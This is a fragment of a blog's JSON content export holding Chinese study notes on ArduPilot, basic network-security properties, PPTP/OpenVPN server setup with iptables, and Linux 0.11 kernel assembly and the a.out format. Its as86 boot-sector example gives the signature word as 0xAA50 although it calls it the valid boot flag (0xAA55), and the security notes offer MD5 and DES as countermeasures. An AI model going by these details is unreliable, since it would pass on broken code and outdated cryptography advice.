id=\"Ardupilot\"><a href=\"#Ardupilot\" class=\"headerlink\" title=\"Ardupilot\"></a>Ardupilot</h1><p>这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序<strong>ArduCopter</strong>，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制…可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入<code>make px4-v2</code>即可．键入<code>make px4-v2-upload</code>即可上载代码．我的开发平台是ubuntu 16.04 amd64.<br><img src=\"/images/targets.png\" alt=\"targets\"></p>\n<h1 id=\"交叉编译工具链\"><a href=\"#交叉编译工具链\" class=\"headerlink\" title=\"交叉编译工具链\"></a>交叉编译工具链</h1><p>熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了…具体到开发Pixhawk所用到的编译器就是<code>arm-none-eabi-gcc</code>家族,详情安装方式参考官网<a href=\"http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html\">APM</a>或者<a href=\"http://dev.px4.io/starting-installing-linux.html\">PX4</a>都可以，也可以看我<a href=\"http://www.nephen.com/2016/01/introduction-to-start-ArduPilot\">学长的教程</a>,只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决…最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.<br><img src=\"/images/arm-none-eabi-gcc.png\" alt=\"arm-none-eabi-gcc\"></p>\n<h1 id=\"上位机\"><a href=\"#上位机\" class=\"headerlink\" title=\"上位机\"></a>上位机</h1><p>一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．<br><img src=\"/images/APMPlanner.png\" alt=\"APMPlanner\"></p>\n<hr>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．</p>\n"},{"title":"网络安全基本要素及对策","date":"2016-09-18T03:49:15.000Z","_content":"\n\n\n> 昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)\n\n## 机密性\n定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。  \n策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)\n## 完整性\n定义:保证数据的一致性，防止数据被非法用户篡改。  \n策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法\n## 可用性\n定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)  \n策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.\n## 可控性\n定义:对信息的传播及内容具有控制能力。  \n策略:各种访问控制,例如ACL包过滤,防火墙等机制.\n## 不可抵赖性\n定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。  \n策略:数字签名,用公钥密码机制,如RSA等.\n\n","source":"_posts/网络安全基本要素及对策.md","raw":"---\ntitle: 网络安全基本要素及对策\ndate: 2016-09-18 11:49:15\ntags:\n- network security\n- information security\ncategories:\n- study\n- work\n---\n\n\n\n> 昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)\n\n## 机密性\n定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。  \n策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)\n## 完整性\n定义:保证数据的一致性，防止数据被非法用户篡改。  \n策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法\n## 可用性\n定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)  \n策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.\n## 可控性\n定义:对信息的传播及内容具有控制能力。  \n策略:各种访问控制,例如ACL包过滤,防火墙等机制.\n## 不可抵赖性\n定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。  \n策略:数字签名,用公钥密码机制,如RSA等.\n\n","slug":"网络安全基本要素及对策","published":1,"updated":"2016-11-14T02:56:11.149Z","_id":"civhncdhm001wg8uaivc0t9jz","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)</p>\n</blockquote>\n<h2 id=\"机密性\"><a href=\"#机密性\" class=\"headerlink\" title=\"机密性\"></a>机密性</h2><p>定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。<br>策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)</p>\n<h2 id=\"完整性\"><a href=\"#完整性\" class=\"headerlink\" title=\"完整性\"></a>完整性</h2><p>定义:保证数据的一致性，防止数据被非法用户篡改。<br>策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法</p>\n<h2 id=\"可用性\"><a href=\"#可用性\" class=\"headerlink\" title=\"可用性\"></a>可用性</h2><p>定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)<br>策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.</p>\n<h2 id=\"可控性\"><a href=\"#可控性\" class=\"headerlink\" title=\"可控性\"></a>可控性</h2><p>定义:对信息的传播及内容具有控制能力。<br>策略:各种访问控制,例如ACL包过滤,防火墙等机制.</p>\n<h2 id=\"不可抵赖性\"><a href=\"#不可抵赖性\" class=\"headerlink\" title=\"不可抵赖性\"></a>不可抵赖性</h2><p>定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。<br>策略:数字签名,用公钥密码机制,如RSA等.</p>\n","excerpt":"","more":"<blockquote>\n<p>昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)</p>\n</blockquote>\n<h2 id=\"机密性\"><a href=\"#机密性\" class=\"headerlink\" title=\"机密性\"></a>机密性</h2><p>定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。<br>策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)</p>\n<h2 id=\"完整性\"><a href=\"#完整性\" class=\"headerlink\" title=\"完整性\"></a>完整性</h2><p>定义:保证数据的一致性，防止数据被非法用户篡改。<br>策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法</p>\n<h2 id=\"可用性\"><a href=\"#可用性\" class=\"headerlink\" title=\"可用性\"></a>可用性</h2><p>定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)<br>策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.</p>\n<h2 id=\"可控性\"><a href=\"#可控性\" class=\"headerlink\" title=\"可控性\"></a>可控性</h2><p>定义:对信息的传播及内容具有控制能力。<br>策略:各种访问控制,例如ACL包过滤,防火墙等机制.</p>\n<h2 id=\"不可抵赖性\"><a href=\"#不可抵赖性\" class=\"headerlink\" title=\"不可抵赖性\"></a>不可抵赖性</h2><p>定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。<br>策略:数字签名,用公钥密码机制,如RSA等.</p>\n"},{"title":"常用VPN服务器配置","date":"2016-10-27T15:29:29.000Z","_content":"\n\n参考资料:  \n[https://www.nigesb.com/setup-your-own-vpn-with-pptp.html](https://www.nigesb.com/setup-your-own-vpn-with-pptp.html)\n`sudo apt-get install pptpd`  \n编辑/etc/pptpd.conf    \n`localip 10.0.0.1`\n`remoteip 10.0.0.100-200`\n\n\n修改/etc/ppp/pptpd-options.pptpd\n\n`ms-dns 202.96.128.86`\n`ms-dns 202.96.128.166`\n\n/etc/ppp/chap-secrets\n次为：账号，协议，密码，ip地址。\n\n\n编辑系统配置文件/etc/sysctl.conf\n\n`net.ipv4.ip_forward = 1`\n\n\n`sysctl -p`\n\n\n\n\n`iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`\n`iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356`\n`iptables-save`\n\n\n\n\n系统环境：Debian-6 32-bit\n\niptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤\n\n1.创建/etc/iptables文件(文件名可以随意取)\n\n2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限\n`root@hostname:~# touch /etc/network/if-pre-up.d/iptables`\n`root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables`\n\n3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：\n```bash\n#!/bin/sh\n /sbin/iptables-restore < /etc/iptables\n ```\n 4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可\n root@hostname:~# iptables-save > /etc/iptables\n\n //配置openvpn\n http://www.zhengyali.com/?p=52\n http://www.zhengyali.com/?p=66\n http://blog.csdn.net/brad_chen/article/details/49633491\n http://openvpn.ustc.edu.cn/\n\n\n\n\n openvpn之树莓派问题\n\n\n\n `sudo apt-get purge openvpn liblzo2-2`\n `sudo apt-get install openvpn`\n","source":"_posts/常用VPN服务器配置.md","raw":"---\ntitle: 常用VPN服务器配置\ndate: 2016-10-27 23:29:29\ncategories:\n- study\ntags:\n- Configure\n- network security\n---\n\n\n参考资料:  \n[https://www.nigesb.com/setup-your-own-vpn-with-pptp.html](https://www.nigesb.com/setup-your-own-vpn-with-pptp.html)\n`sudo apt-get install pptpd`  \n编辑/etc/pptpd.conf    \n`localip 10.0.0.1`\n`remoteip 10.0.0.100-200`\n\n\n修改/etc/ppp/pptpd-options.pptpd\n\n`ms-dns 202.96.128.86`\n`ms-dns 202.96.128.166`\n\n/etc/ppp/chap-secrets\n次为：账号，协议，密码，ip地址。\n\n\n编辑系统配置文件/etc/sysctl.conf\n\n`net.ipv4.ip_forward = 1`\n\n\n`sysctl -p`\n\n\n\n\n`iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`\n`iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356`\n`iptables-save`\n\n\n\n\n系统环境：Debian-6 32-bit\n\niptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤\n\n1.创建/etc/iptables文件(文件名可以随意取)\n\n2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限\n`root@hostname:~# touch /etc/network/if-pre-up.d/iptables`\n`root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables`\n\n3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：\n```bash\n#!/bin/sh\n /sbin/iptables-restore < /etc/iptables\n ```\n 4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可\n root@hostname:~# iptables-save > /etc/iptables\n\n //配置openvpn\n http://www.zhengyali.com/?p=52\n http://www.zhengyali.com/?p=66\n http://blog.csdn.net/brad_chen/article/details/49633491\n http://openvpn.ustc.edu.cn/\n\n\n\n\n openvpn之树莓派问题\n\n\n\n `sudo apt-get purge openvpn liblzo2-2`\n `sudo apt-get install openvpn`\n","slug":"常用VPN服务器配置","published":1,"updated":"2016-11-14T02:56:11.118Z","_id":"civhncdhm0021g8ua89otcuq2","comments":1,"layout":"post","photos":[],"link":"","content":"<p>参考资料:<br><a href=\"https://www.nigesb.com/setup-your-own-vpn-with-pptp.html\" target=\"_blank\" rel=\"external\">https://www.nigesb.com/setup-your-own-vpn-with-pptp.html</a><br><code>sudo apt-get install pptpd</code><br>编辑/etc/pptpd.conf<br><code>localip 10.0.0.1</code><br><code>remoteip 10.0.0.100-200</code></p>\n<p>修改/etc/ppp/pptpd-options.pptpd</p>\n<p><code>ms-dns 202.96.128.86</code><br><code>ms-dns 202.96.128.166</code></p>\n<p>/etc/ppp/chap-secrets<br>次为：账号，协议，密码，ip地址。</p>\n<p>编辑系统配置文件/etc/sysctl.conf</p>\n<p><code>net.ipv4.ip_forward = 1</code></p>\n<p><code>sysctl -p</code></p>\n<p><code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code><br><code>iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356</code><br><code>iptables-save</code></p>\n<p>系统环境：Debian-6 32-bit</p>\n<p>iptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤</p>\n<p>1.创建/etc/iptables文件(文件名可以随意取)</p>\n<p>2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限<br><code>root@hostname:~# touch /etc/network/if-pre-up.d/iptables</code><br><code>root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables</code></p>\n<p>3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\"> /sbin/iptables-restore &lt; /etc/iptables</div></pre></td></tr></table></figure></p>\n<p> 4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可<br> root@hostname:~# iptables-save &gt; /etc/iptables</p>\n<p> //配置openvpn<br> <a href=\"http://www.zhengyali.com/?p=52\" target=\"_blank\" rel=\"external\">http://www.zhengyali.com/?p=52</a><br> <a href=\"http://www.zhengyali.com/?p=66\" target=\"_blank\" rel=\"external\">http://www.zhengyali.com/?p=66</a><br> <a href=\"http://blog.csdn.net/brad_chen/article/details/49633491\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/brad_chen/article/details/49633491</a><br> <a href=\"http://openvpn.ustc.edu.cn/\" target=\"_blank\" rel=\"external\">http://openvpn.ustc.edu.cn/</a></p>\n<p> openvpn之树莓派问题</p>\n<p> <code>sudo apt-get purge openvpn liblzo2-2</code><br> <code>sudo apt-get install openvpn</code></p>\n","excerpt":"","more":"<p>参考资料:<br><a href=\"https://www.nigesb.com/setup-your-own-vpn-with-pptp.html\">https://www.nigesb.com/setup-your-own-vpn-with-pptp.html</a><br><code>sudo apt-get install pptpd</code><br>编辑/etc/pptpd.conf<br><code>localip 10.0.0.1</code><br><code>remoteip 10.0.0.100-200</code></p>\n<p>修改/etc/ppp/pptpd-options.pptpd</p>\n<p><code>ms-dns 202.96.128.86</code><br><code>ms-dns 202.96.128.166</code></p>\n<p>/etc/ppp/chap-secrets<br>次为：账号，协议，密码，ip地址。</p>\n<p>编辑系统配置文件/etc/sysctl.conf</p>\n<p><code>net.ipv4.ip_forward = 1</code></p>\n<p><code>sysctl -p</code></p>\n<p><code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code><br><code>iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356</code><br><code>iptables-save</code></p>\n<p>系统环境：Debian-6 32-bit</p>\n<p>iptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤</p>\n<p>1.创建/etc/iptables文件(文件名可以随意取)</p>\n<p>2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限<br><code>root@hostname:~# touch /etc/network/if-pre-up.d/iptables</code><br><code>root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables</code></p>\n<p>3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\"> /sbin/iptables-restore &lt; /etc/iptables</div></pre></td></tr></table></figure></p>\n<p> 4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可<br> root@hostname:~# iptables-save &gt; /etc/iptables</p>\n<p> //配置openvpn<br> <a href=\"http://www.zhengyali.com/?p=52\">http://www.zhengyali.com/?p=52</a><br> <a href=\"http://www.zhengyali.com/?p=66\">http://www.zhengyali.com/?p=66</a><br> <a href=\"http://blog.csdn.net/brad_chen/article/details/49633491\">http://blog.csdn.net/brad_chen/article/details/49633491</a><br> <a href=\"http://openvpn.ustc.edu.cn/\">http://openvpn.ustc.edu.cn/</a></p>\n<p> openvpn之树莓派问题</p>\n<p> <code>sudo apt-get purge openvpn liblzo2-2</code><br> <code>sudo apt-get install openvpn</code></p>\n"},{"title":"Linux内核0.11完全注释 第三章","date":"2016-11-15T08:46:00.000Z","_content":"\n> 介绍Linux内核0.11版本的编程语言和环境以及目标文件格式等  \n\n------------\n\n\n# as86 和 ld86 \n- as86 在开发Linux内核时仅用来创建16位的启动引导扇区程序boot/boosect.s和实模式下的初始设置程序boot/setup.s的二进制执行代码.采用Intel格式的汇编指令格式.\n - 汇编的命令行基本格式:`as [选项] -o objfile srcfile`.\n - `=`或`EQU`符号等价于C语言的宏\n - `.`编译过程中的位置计数器,等价于`$`\n - `:`符号,本质为汇编地址\n - 目标文件objfile起码包含三个section,**.text**,**.data**,**.bss**\n\n- as86汇编语言程序例程:\n```asm\n!\n!Filename:boot.s\n!\n!Description: boot section codes on Intel CPU\n!\n!Author:rutk1t0r\n!\n!Data:2016.11.8\n!\n!GPL\n!\n!method:\n![/root]# as86 -0 -a -o boot.o boot.s    #编译\n![/root]# ld86 -0 -s -o boot boot.o      #链接\n![/root]# dd bs=32 if=boot of=/dev/fd0 skip1   #写入软盘或者image文件\n!==================================================================\n!\n!\n! boot.s -- bootsect.s 的框架程序.用代码0x07替换字符串msg1中一个字符,然后在屏幕上1行显示\n!\n.globl begtext, begdata, begbss, endtext, enddata, endbss !全局标识符,供ld86链接使用\n.text  !代码段\nbegtext:\n.data\nbegdata:\n.bss\nbegbss:\n.text\nBOOTSEG = 0x07c0   !类似于C语言宏定义,EQU,Intel内存代码执行首地址\nentry start        !告知链接程序,程序从start标号开始执行\nstart:\njmpi\tgo, BOOTSEG !段间跳转,两个地址,低地址16位送IP寄存器,高地址16位送cs段寄存器\ngo:\n\t\tmov\tax, cs  !将cs段寄存器值同步至ds,es,此代码未用到ss\n\t\tmov es, ax\n\t\tmov ds, ax\n\t\tmov [msg1+17], ah   !示例修改串,然后会调用BIOS中断,参考链接https://zh.wikipedia.org/wiki/INT_10\n\t\tmov\tcx, #20  \t\t!立即数需要前缀#,根据BIOS提供的接口约定,cx为字符总个数\n\t\tmov\tdx, #0x1004  \t!约定,位置,此时为17行5列\n\t\tmov bx, #0x000c    \t!约定,字符属性(红色)\n\t\tmov bp, #msg1\t\t!约定,字符缓冲区首地址\n\t\tmov ax, #0x1301\t\t!ah=0x13表示写字符串功能号\n\t\tint 0x10\t\t\t!调用BIOS中断\nloop1:  jmp \tloop1  \t\t!死循环待机\nmsg1:\t.ascii\t\"Loading system...\" !字符20个,包括回车换行\n\t\t.byte \t13,10\n.org\t510\t\t\t\t\t!表示以后的语句从偏移地址510开始放\n\t\t.word \t0xAA50\t\t!有效引导扇区标志,约定\n.text\nendtext:\n.data\nenddata:\n.bss\nendbss:\n\n```\n - 可参照如下命令进行编译链接等\n ![Linux_0.11_chapter3_as86_compile.png](/images/Linux_0.11_chapter3_as86_compile.png)\n - 本应该512字节的boot程序(MBR)多出32字节为MINIX可执行文件头结构,需剔除掉(dd命令等).而后可用Bochs等模拟器观察现象,正常如下:\n ![Linux_0.11_chapter3_as86_boot.png.png](/images/Linux_0.11_chapter3_as86_boot.png.png)\n- **as86具体使用方法:**\n![Linux_0.11_chapter3_as86.png](/images/Linux_0.11_chapter3_as86.png)\n- **ld86具体使用方法:**\n![Linux_0.11_chapter3_ld86.png](/images/Linux_0.11_chapter3_ld86.png)\n\n# GNU as汇编\n- 内核中其余所有汇编语言程序(包括C语言产生的汇编程序)均由gas来编译,并与C语言程序编译产生的模块进行链接. \n- **Intel格式的汇编与AT&T格式的汇编区别:**\n![Linux_0.11_chapter3_Intel_AT&T_diff.png](/images/Linux_0.11_chapter3_Intel_AT&T_diff.png)\n- as汇编器对汇编语言程序只进行简单地预处理,比如调整并删除多余空格和制表符,删除注释等;如需要进行宏替换则可以让汇编语言程序使用大写后缀'.S'来让as使用gcc的CPP预处理功能.\n- 具体关于汇编指令部分可以参考Intel开发者手册\n## 区和重定位\n - 区:有时候也成为段,节或部分,英文为section,用来表示一个地址范围,操作系统将会以相同的方式对待和处理改地址范围的数据信息.\n - 重定位:当汇编过后的数据中出现重定位节时候,由链接器负责修正重定位的数据部分(至于为什么会需要重定位这与很多机制有关系了,必须虚拟内存等).\n## 链接器涉及的区:\n ![Linux_0.11_chapter3_linker_section.png](/images/Linux_0.11_chapter3_linker_section.png)\n- 关于gcc对于C程序的编译和链接过程可参考[前文](http://www.rutk1t0r.org/2016/09/06/C%E8%AF%AD%E8%A8%80%E5%AE%8F%E5%AE%9A%E4%B9%89%E5%B0%8F%E8%AF%95/)\n## 嵌入汇编\n - 格式：\n\t```asm\n\tasm(\"汇编语句\"\n\t\t:输出寄存器\n\t\t:输入寄存器\n\t\t:会被修改的寄存器);\n\t```\n - 嵌入汇编的好处就是利用gcc的灵活性在C语言里面精练地实现某些特定功能\n - Linux内核源码中仍然在使用圆括号的组合语句，一般用在宏定义。\n - strcpy的嵌入汇编实现如下，因为首先要进行预处理，所以增加换行便于浏览。\n\t```C\n\t//将字符串(src)拷贝到另一字符串(dest)，直到遇到NULL字符后终止\n\t//参数:dest - 目的字符串指针, src - 源字符串指针, %0 - esi(src), %1 - edi(dest)。\n\textern inline char *strcpy(char *dest, const char *src)\n\t{\n\t__asm__(\"cld\\n\"\t\t\t//清空方向标志，往上为默认增长\n\t\t\t\"1:\\tlodsb\\n\\t\" //加载DS:[esi]处1字节->al,esi++\n\t\t\t\"stosb\\n\\t\"\t\t//存储al->ES:[edi],edi++\n\t\t\t\"testb %%al, %%al\\n\\t\"\t//测试刚刚存储是否为NULL字符\n\t\t\t\"jne 1b\"\t\t//不是则继续跳到标号1处，否则就结束\n\t\t\t::\"S\"(src), \"D\"(dest)\":\"si\",\"di\",\"ax\");\n\treturn dest;\t\t\t//返回目的字符串首地址，实现链式\n\t}\n\t```\n\n## C与汇编的相互调用\n- 调用约定(主要根据参数顺序、传参方式以及平衡堆栈者等来区分,当然其他体系结构也有其他实现,这里主要是IA-32体系,Intel 64调用约定已经开始大幅度使用寄存器传参)\n  - fastcall:Linux系统调用比较常用，直接利用寄存器传参，子程序(被调用者)清除栈帧\n  - __cdecl:参数从右至左压栈，由调用者负责清除栈空间，可变参数\n  - stdcall:Windows的Win32 API常用，与__cdecl区别是被调用者一般用类似`ret n`指令来清除栈空间(清除栈空间主要是恢复被保存的寄存器值以及栈指针回归)\n  - PASCAL:从左到右压栈，被调用者清栈\n  - this:C++标准的Microsoft实现利用ecx传递对象首地址\n- 在软件工程师的角度,以汇编语言作为\"车轮子\"和\"底线\"完全可以应付了绝大多数的问题了，因此只要源代码汇编过后保持一致性，各种语言之间的相互调用都是可以的。\n\n\n# Linux 0.11目标文件格式\n\n\n> 有关目标文件和链接程序的基本工作原理可参见John R.Levine著的《Linkers & Loaders》(有中文译版）一书。\n\n## a.out映像\n- 在Linux 0.11系统中，GNU gcc或者gas编译输出的目标模块文件和链接程序所生成的可执行文件都使用了UNIX传统的a.out格式。对于具有内存分页机制的系统(可由硬件芯片给予软件以支持）来说，这是一种简单有效的目标文件格式。\n![Linux_0.11_chapter3_a.out_map.png](/images/Linux_0.11_chapter3_a.out_map.png)\n![Linux_0.11_chapter3_a.out_map_header1.png](/images/Linux_0.11_chapter3_a.out_map_header1.png)\n![Linux_0.11_chapter3_a.out_map_header2.png](/images/Linux_0.11_chapter3_a.out_map_header2.png)\n- Linux内核可执行文件加载器将可执行文件从磁盘加载到内存中的映像\n![Linux_0.11_chapter3_a.out_map_to_memory.png](/images/Linux_0.11_chapter3_a.out_map_to_memory.png)\n- 链接程序的操作\n![Linux_0.11_chapter3_a.out_linkers.png](/images/Linux_0.11_chapter3_a.out_linkers.png)\n\n## 链接程序预定义变量\n- 在链接过程中，链接器ld和ld86会使用自身的变量记录下执行程序中每个段的逻辑地址。因此可以在程序用通过几个外部变量来获取程序中段的位置。\n - _etext(etext):它的地址是.text段结束后的第一个地址;\n - _edata(edata):它的地址是.data初始化数据区后的第一个地址;\n - _end(end):它的地址是未初始化数据区.bss后的第一个地址位置。\n - 带下划线前缀和不带是等价的，唯一的区别在ANSI、POSIX等标准中没有定义符号etext、edata和end。\n - Linux 0.1x 内核在初始化块设备高速缓存区时(fs/buffer.c)， 就使用了变量_end来获取内核映像文件Image在内存中的末端后的位置，并从这个位置起开始设置高速缓冲区。\n\n- 利用System.map文件可以找寻到**目标文件及符号信息映射到内存的位置**、**公共符号设置**、**链接中包含的所有文件成员以及其引用的符号**和**内核运行错误信息及调试**。\n - 目标文件符号列表文件中的符号类型\n ![Linux_0.11_chapter3_a.out_symbol1.png](/images/Linux_0.11_chapter3_a.out_symbol1.png)\n ![Linux_0.11_chapter3_a.out_symbol2.png](/images/Linux_0.11_chapter3_a.out_symbol2.png)\n\n# Make 和 Makefile\n- make程序通过Makefile文件知道如何编译和链接程序\n- make的执行过程为两个阶段。\n - 读取**所有的**Makefile文件以及包含的Makefile文件等，记录所有的变量及值、隐式的或显式的规则，并构造出所有目标对象及其先决条件的一幅全景图;\n - make就使用这些内部结构来确定哪个目标对象需要被重建，并且根据相应的规则来操作。\n- 当make重新编译程序的时，每个修改过的C代码文件(根据文件时间戳)必须被重新编译。如果头文件被修改过了，那么为了保证正确，make也会重新编译每个包含此头文件的C代码文件(因此某些声明最好放在头文件中，加快编译速度)。\n\n# 总结\n- 基本的开发环境需要搭建和理解\n- 汇编语言在Linux内核中的重要性\n- 目标文件格式基本格式需理解(PE更复杂)\n- 链接器的高级特效需理解\n- Makefile高级用法需要会用\n\n","source":"_posts/Linux内核0-11完全注释-第三章.md","raw":"---\ntitle: Linux内核0.11完全注释 第三章\ndate: 2016-11-15 16:46:00\ncategories:\n- study\ntags:\n- C/C++\n- Linux kernel\n- Asm\n- LDD\n---\n\n> 介绍Linux内核0.11版本的编程语言和环境以及目标文件格式等  \n\n------------\n\n\n# as86 和 ld86 \n- as86 在开发Linux内核时仅用来创建16位的启动引导扇区程序boot/boosect.s和实模式下的初始设置程序boot/setup.s的二进制执行代码.采用Intel格式的汇编指令格式.\n - 汇编的命令行基本格式:`as [选项] -o objfile srcfile`.\n - `=`或`EQU`符号等价于C语言的宏\n - `.`编译过程中的位置计数器,等价于`$`\n - `:`符号,本质为汇编地址\n - 目标文件objfile起码包含三个section,**.text**,**.data**,**.bss**\n\n- as86汇编语言程序例程:\n```asm\n!\n!Filename:boot.s\n!\n!Description: boot section codes on Intel CPU\n!\n!Author:rutk1t0r\n!\n!Data:2016.11.8\n!\n!GPL\n!\n!method:\n![/root]# as86 -0 -a -o boot.o boot.s    #编译\n![/root]# ld86 -0 -s -o boot boot.o      #链接\n![/root]# dd bs=32 if=boot of=/dev/fd0 skip1   #写入软盘或者image文件\n!==================================================================\n!\n!\n! boot.s -- bootsect.s 的框架程序.用代码0x07替换字符串msg1中一个字符,然后在屏幕上1行显示\n!\n.globl begtext, begdata, begbss, endtext, enddata, endbss !全局标识符,供ld86链接使用\n.text  !代码段\nbegtext:\n.data\nbegdata:\n.bss\nbegbss:\n.text\nBOOTSEG = 0x07c0   